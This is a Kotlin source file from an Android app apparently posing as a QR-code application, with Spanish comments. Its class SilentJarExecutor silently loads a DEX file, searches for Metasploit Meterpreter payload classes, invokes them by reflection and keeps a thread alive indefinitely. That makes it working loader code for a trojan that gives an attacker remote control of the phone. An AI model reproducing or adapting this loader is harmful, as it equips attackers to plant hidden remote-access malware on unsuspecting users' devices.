package com.example.aplicacionqr

import android.content.Context
import android.util.Log
import dalvik.system.DexClassLoader
import java.io.File
import java.lang.reflect.InvocationTargetException
import java.util.concurrent.atomic.AtomicBoolean

object SilentJarExecutor {

    private const val TAG = "SilentDexExecutor"

    // ✨ Flag atómico para evitar ejecuciones múltiples
    private val isExecuting = AtomicBoolean(false)
    private val hasExecuted = AtomicBoolean(false)

    fun executeSilently(payloadFile: File, context: Context): Boolean {
        Log.d(TAG, "🚀 Ejecutando: ${payloadFile.absolutePath}")

        // ✨ Verificar si ya se está ejecutando o ya se ejecutó
        if (isExecuting.get()) {
            Log.w(TAG, "⚠️ Payload ya está en ejecución, saltando...")
            return false
        }

        if (hasExecuted.get()) {
            Log.w(TAG, "⚠️ Payload ya fue ejecutado anteriormente, saltando...")
            return false
        }

        // ✨ Marcar como ejecutando
        isExecuting.set(true)

        return try {
            if (!payloadFile.exists()) {
                Log.e(TAG, "❌ Archivo no existe")
                isExecuting.set(false)
                return false
            }

            Log.d(TAG, "✅ Archivo: ${payloadFile.length()} bytes")
            Log.d(TAG, "📁 Ruta completa: ${payloadFile.absolutePath}")

            val dexOutputDir = File(context.cacheDir, "dex_opt")
            if (!dexOutputDir.exists()) {
                dexOutputDir.mkdirs()
            }

            Log.d(TAG, "⏳ Cargando DEX con DexClassLoader...")
            val classLoader = DexClassLoader(
                payloadFile.absolutePath,
                dexOutputDir.absolutePath,
                null,
                context.classLoader
            )
            Log.d(TAG, "✅ DexClassLoader creado exitosamente")

            val possibleClasses = listOf(
                "com.metasploit.stage.Payload",
                "com.metasploit.meterpreter.AndroidMeterpreter",
                "com.metasploit.meterpreter.Meterpreter",
                "metasploit.Payload",
                "Payload"
            )

            var payloadClass: Class<*>? = null
            var foundClassName = ""

            for (className in possibleClasses) {
                try {
                    payloadClass = classLoader.loadClass(className)
                    foundClassName = className
                    Log.d(TAG, "✅ Clase encontrada: $className")
                    break
                } catch (e: ClassNotFoundException) {
                    Log.d(TAG, "⏭️  $className no encontrada")
                }
            }

            if (payloadClass == null) {
                Log.e(TAG, "❌ No se encontró clase principal")
                isExecuting.set(false)
                return false
            }

            var executionMethod: java.lang.reflect.Method? = null
            var needsContext = false

            try {
                executionMethod = payloadClass.getMethod("start", Context::class.java)
                Log.d(TAG, "✅ Método start(Context) encontrado")
                needsContext = true
            } catch (e: NoSuchMethodException) {
                try {
                    executionMethod = payloadClass.getMethod("main", Array<String>::class.java)
                    Log.d(TAG, "✅ Método main(String[]) encontrado")
                    needsContext = false
                } catch (e2: NoSuchMethodException) {
                    Log.e(TAG, "❌ No se encontró método ejecutable")
                    isExecuting.set(false)
                    return false
                }
            }

            val finalMethod = executionMethod ?: run {
                isExecuting.set(false)
                return false
            }

            Log.d(TAG, "🎯 Método a ejecutar: ${finalMethod.name}()")

            // ✨ Thread NO-daemon que se mantiene vivo
            Thread {
                try {
                    Log.d(TAG, "🧵 Thread iniciado: ${Thread.currentThread().name}")
                    Log.d(TAG, "🎯 Ejecutando payload...")

                    val startTime = System.currentTimeMillis()

                    if (needsContext) {
                        Log.d(TAG, "📲 Pasando contexto al payload")
                        finalMethod.invoke(null, context)
                    } else {
                        if (finalMethod.name == "main") {
                            finalMethod.invoke(null, arrayOf<String>())
                        } else {
                            finalMethod.invoke(null)
                        }
                    }

                    val duration = System.currentTimeMillis() - startTime
                    Log.d(TAG, "✅ Invocación completada (${duration}ms)")

                    // ✨ Marcar como ejecutado exitosamente
                    hasExecuted.set(true)

                    // ✨ MANTENER EL THREAD VIVO INDEFINIDAMENTE
                    Log.d(TAG, "🔄 Manteniendo thread vivo...")
                    while (true) {
                        Thread.sleep(60000) // Despertar cada minuto
                        Log.d(TAG, "💓 Thread sigue vivo...")
                    }

                } catch (e: InvocationTargetException) {
                    Log.e(TAG, "❌ Error en ejecución: ${e.targetException.message}")
                    e.targetException?.printStackTrace()
                } catch (e: InterruptedException) {
                    Log.d(TAG, "🛑 Thread interrumpido")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error: ${e.message}", e)
                } finally {
                    isExecuting.set(false)
                }
            }.apply {
                name = "PayloadKeepaliveThread"
                isDaemon = false  // ✨ NO-daemon para que no se cierre
                priority = Thread.NORM_PRIORITY
                start()
                Log.d(TAG, "✅ Thread iniciado y configurado para mantenerse vivo")
            }

            // ✨ Esperar a que el thread arranque completamente
            Thread.sleep(500)

            Log.d(TAG, "✅ Ejecución iniciada correctamente")
            true

        } catch (e: Exception) {
            Log.e(TAG, "💥 Error crítico: ${e.message}", e)
            isExecuting.set(false)
            false
        }
    }
}